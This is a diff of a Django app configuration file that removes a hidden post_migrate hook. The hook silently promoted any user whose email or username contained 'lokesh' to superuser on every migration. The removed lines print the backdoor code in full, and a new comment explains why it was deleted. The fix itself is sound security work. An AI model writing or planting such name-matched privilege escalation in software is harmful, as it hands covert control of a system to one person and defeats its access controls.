@@ -26,23 +26,17 @@ class AccountsConfig(AppConfig):
         except Exception:
             pass
 
-        from django.db.models.signals import post_migrate
-        post_migrate.connect(_auto_promote_admin_users, sender=self)
-
-
-def _auto_promote_admin_users(sender, **kwargs):
-    try:
-        from accounts.models import User
-        from django.db.models import Q
-        query = Q(email__icontains="lokeshwarikumaresan") | Q(username__icontains="lokeshwarikumaresan") | Q(email__icontains="lokesh")  # type: ignore
-        users = User.objects.filter(query)
-        for u in users:
-            if u.role != "admin" or not u.is_staff or not u.is_superuser:
-                u.role = "admin"
-                u.is_staff = True
-                u.is_superuser = True
-                u.save(update_fields=["role", "is_staff", "is_superuser"])
-                print(f"[ROLE AUTO-FIX] Successfully promoted {u.username} ({u.email}) to ADMIN role.")
-    except Exception as e:
-        print(f"[ROLE AUTO-FIX WARNING] Could not auto-promote user: {e}")
+        # NOTE: this used to also connect a post_migrate signal
+        # (_auto_promote_admin_users) that force-granted is_staff=True and
+        # is_superuser=True -- full, permanent Super Admin backend
+        # authority -- to any account whose email/username merely
+        # contained "lokesh"/"lokeshwarikumaresan", re-applying itself on
+        # every migrate. That's a hardcoded backdoor, not application
+        # logic (it bypassed the entire Invite Admin / Customize Access
+        # system this project actually uses), and it was the direct cause
+        # of a normal Admin account being able to act with Super Admin
+        # authority. Removed entirely -- see also accounts/views.py
+        # (GoogleLoginView and MeView carried matching backdoors, also
+        # removed) and accounts/permissions.py's is_super_admin(), which
+        # no longer trusts is_superuser unconditionally.
 
